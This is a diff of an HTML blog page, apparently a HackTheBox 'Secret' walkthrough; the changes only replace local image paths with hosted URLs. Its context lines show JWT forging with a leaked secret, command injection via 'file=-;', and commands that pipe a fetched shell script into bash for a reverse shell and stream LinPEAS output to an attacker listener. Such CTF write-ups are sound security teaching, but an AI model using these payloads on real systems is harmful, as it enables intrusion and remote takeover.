@@ -53,16 +53,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on the output from NMAP, the web-server and a NodeJS service is running on port &lt;code&gt;80&lt;/code&gt; and &lt;code&gt;3000&lt;/code&gt;, respectively. There is also a SSH listening on port &lt;code&gt;22&lt;/code&gt;, however, it is not exploitable even in these easy-rated machines, at least from my own experience. So, let us pay our attention to the former two.&lt;/p&gt;
 &lt;h3 id=&#34;web-server&#34;&gt;Web-server&lt;/h3&gt;
 &lt;p&gt;Visiting either &lt;code&gt;10.10.11.120:80&lt;/code&gt; or &lt;code&gt;10.10.11.120:3000&lt;/code&gt; does provide you with the same webpage.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5CDevelopment%5Cgithub%5Crepos%5Cimage-host%5C2022-01-13-HTB-Secret%5Csecret1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/secret1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;You can see why this box is rated easy since it presumably enables us to download its source code in the last section. Beside that and the &lt;strong&gt;Live Demo&lt;/strong&gt; feature, there are no other feasible or potential vectors around but some protracted documentation.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Live Demo&lt;/strong&gt; redirects us to a assumed API endpoint running on the server.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Normally, we would use auxiliaries to enumerate the endpoint, and &lt;code&gt;dirb&lt;/code&gt;, &lt;code&gt;gobuster&lt;/code&gt; are my favorites. There is, nevertheless, a trivial problem that when using &lt;code&gt;gobuster&lt;/code&gt;, you will probably encounter the following error.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 └─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,txt,html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; -o gobuster.txt
 Error: the server returns a status code that matches the provided options &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; non existing urls. http://10.10.11.120/api/767c3163-5f9d-4235-b2ec-3c8766da50ab &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Length: 93&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. To &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt; please exclude the status code, the length or use the --wildcard switch
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This happens due to the web-server is prone to be configurated to always response with &lt;code&gt;200 OK&lt;/code&gt; code. You can verify this again by sending a &lt;code&gt;CURL&lt;/code&gt; request to a non-existing page.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;On that account, we have to exclude &lt;code&gt;200 OK&lt;/code&gt; responses and, hence, our command should look like this:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 └─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt; -x php,bak,txt,html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; -o gobuster.txt
@@ -85,7 +85,7 @@ END_TIME: Thu Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 20:2
 DOWNLOADED: &lt;span style=&#34;color:#ae81ff&#34;&gt;4612&lt;/span&gt; - FOUND: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
 ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All these enumerated paths, however, are inaccessible without valid credentials as their responses are &lt;code&gt;401&lt;/code&gt; with an &lt;strong&gt;Access Denied&lt;/strong&gt; message. Despite being restricted, we are able to get the gist of what we should do next.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-15_10-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-15_10-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h3&gt;
 &lt;p&gt;In this step, let us have a look at the open-source project provided which can be download at the bottom of the homepage.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -516,9 +516,9 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQ
 ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As the above snippet suggested, &lt;code&gt;auth-token&lt;/code&gt; in our header request with its &lt;code&gt;TOKEN_SECRET&lt;/code&gt; are to be verified, the request is then passed to &lt;code&gt;/api/priv&lt;/code&gt; or &lt;code&gt;/api/logs&lt;/code&gt; for a username comparison and we therefrom have access to the protected resources which are required for the later stage.&lt;/p&gt;
 &lt;p&gt;Usually, when dealing with JWT, one of my favorites is &lt;a href=&#34;https://JWT.io&#34;&gt;JWT.io&lt;/a&gt; because of its straightforward and friendly design but you can always have an alternative &lt;a href=&#34;https://github.com/ticarpi/jwt_tool&#34;&gt;CLI option&lt;/a&gt; in case internet is not available or whatever your reason is. Anyway, we are going with the web version and conveniently paste the received token there.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-22_21-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-22_21-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;In the previous enumeration step, we have known &lt;code&gt;.env&lt;/code&gt; is from which to look for the secret key. Ergo, we can easily snatch it from the file yet that was just what I thought and consequently, it did take a plenty of time for me to figure out where the &lt;em&gt;original&lt;/em&gt; one is. Try having a guess before you carry on to the solution.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-25_09-49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-25_09-49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And I expect you still remember the extracting process with GitTools in our initial enumeration as it now provides the original &lt;code&gt;TOKEN_SECRET&lt;/code&gt;. With that in mind, let us skim through the dumped contents.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 └─$ ls -l ./www/extracted 
@@ -538,7 +538,7 @@ drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy ka
 DB_CONNECT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mongodb://127.0.0.1:27017/auth-web&amp;#39;&lt;/span&gt;
 TOKEN_SECRET &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to this, we now have the correct token to impersonate &lt;code&gt;theadmin&lt;/code&gt;. As I have mentioned earlier, it is only necessary to modify &lt;code&gt;&amp;quot;name&amp;quot;&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-26_16-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-26_16-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We then can send a request to the &lt;code&gt;/api/priv&lt;/code&gt; endpoint to test out the newly forged token using Burpsuite.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;// Request
 &lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /api/priv &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
@@ -597,7 +597,7 @@ ETag: W/&amp;#34;4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU&amp;#34;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; URL encoding is mandatory to perform complex input with special characters (spaces, dashes, etc.).&lt;/em&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Prints CURL&#39;s version
 file=-;curl --version
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_13-19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_13-19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;After guaranteeing that our code is fully functional, let us connect to the remote machine via a simple reverse shell.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Create a reverse shell script and save it under ./www/rs.sh&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
@@ -613,7 +613,7 @@ $ rlwrap -cAr nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&g
 &lt;span style=&#34;color:#75715e&#34;&gt;# Send the RCE payload to the server&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;# -;curl http://10.10.14.9:8088/rs.sh | bash&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get ourselves a shell on the server, navigate to &lt;code&gt;$HOME&lt;/code&gt; and read the user&amp;rsquo;s flag.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_14-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_14-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;stage-3-privilege-escalation&#34;&gt;Stage 3: Privilege Escalation&lt;/h3&gt;
 &lt;p&gt;In this final stage, I would want to use &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&#34;&gt;LinPEAS&lt;/a&gt;, one of my favorite enumeration tools, to aid us in gaining a better understanding of the target system. You can either inspect the output on-the-fly or stream it back to your machine for a more convenient examination.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On victim&amp;#39;s machine&lt;/span&gt;
@@ -625,7 +625,7 @@ $ curl http://10.10.14.9:8088/linpeas.sh | bash | nc 10.10.14.9 &lt;span style=&
 $ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; | tee linpeas.output
 $ cat linpeas.output
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A lot of noises notwithstanding, LinPEAS does find &lt;code&gt;/opt/count&lt;/code&gt;, an intriguing binary with SUID bit&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-09_10-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-09_10-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and its provided source code.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# /opt/code.c
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
